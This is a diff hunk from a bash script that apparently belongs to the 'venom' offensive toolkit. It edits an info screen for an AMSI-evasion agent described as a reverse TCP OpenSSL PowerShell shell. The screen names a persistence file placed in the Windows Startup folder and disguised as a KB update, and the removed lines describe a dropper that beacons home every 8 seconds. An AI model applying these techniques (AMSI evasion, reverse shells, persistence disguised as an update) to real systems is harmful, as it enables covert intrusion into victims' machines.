@@ -57,17 +57,9 @@ echo "    ACTIVE ON    : ${RedF}$FIRST_ACCESS${BlueF}"
 echo "    LAST ACCESS  : ${CyanF}$LAST_ACCESS${BlueF}"
 echo "    DROPPERNAME  : $DROPPER"
 echo "    CATEGORIE    : Amsi Evasion (agent nº2)"
-echo "    DESCRIPTION  : Reverse OpenSSL Powershell Shell"
+echo "    DESCRIPTION  : Reverse TCP OpenSSL PS Shell"
 echo "    AGENT RPATH  : $RPATH"
 echo "    PERSISTENCE  : %appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$ID.update.bat"
-echo ""
-echo "    Detail Description"
-echo "    ------------------"
-echo "    If sellected 'add persistence' to dropper in venom amsi evasion agent nº2"
-echo "    Them the dropper when executed it will create in remote target startup folder"
-echo "    one script named 'KB4524147_$ID.update.bat' that beacons home from 8 to 8 sec"
-echo "    on every target startup until a valid tcp connection is found (netstat -ano)."
-echo "    'Venom also creates this handler file (zip) to store persistence settings'."
 echo "" && echo ${BlueF}:Press ${YellowF}"'ENTER'"${BlueF} to continue ..${Reset}
 read op
 cls
